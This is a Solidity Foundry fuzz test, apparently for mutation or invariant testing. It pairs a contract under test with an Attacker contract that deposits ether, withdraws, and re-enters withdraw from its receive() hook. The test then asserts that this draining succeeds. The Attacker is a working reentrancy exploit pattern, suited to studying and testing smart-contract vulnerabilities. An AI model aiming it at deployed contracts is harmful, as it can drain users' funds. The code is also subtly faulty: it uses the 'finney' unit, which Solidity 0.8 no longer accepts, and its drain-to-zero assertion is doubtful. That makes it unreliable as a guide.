pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    Attacker atk;

    function setUp() public {
        c = new C();
        atk = new Attacker(c);
    }

    function testFuzz_property(uint256 amount) public {
        amount = bound(amount, 1, 1 ether);
        vm.deal(address(atk), amount + 1 ether);
        bool ok = true;
        try atk.attack{value: amount}(amount) {
            ok = true;
        } catch {
            ok = false;
        }
        // Rule: a re-entrant withdraw during the payout succeeds, so the whole
        // attack completes and the contract's recorded ether is fully paid out.
        assertTrue(ok && address(c).balance == 0);
    }
}

contract Attacker {
    C c;
    bool reentered;

    constructor(C c_) {
        c = c_;
    }

    function attack(uint256 a) external payable {
        c.deposit{value: a}();
        reentered = false;
        c.withdraw(a);
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            c.withdraw(10 finney);
        }
    }
}

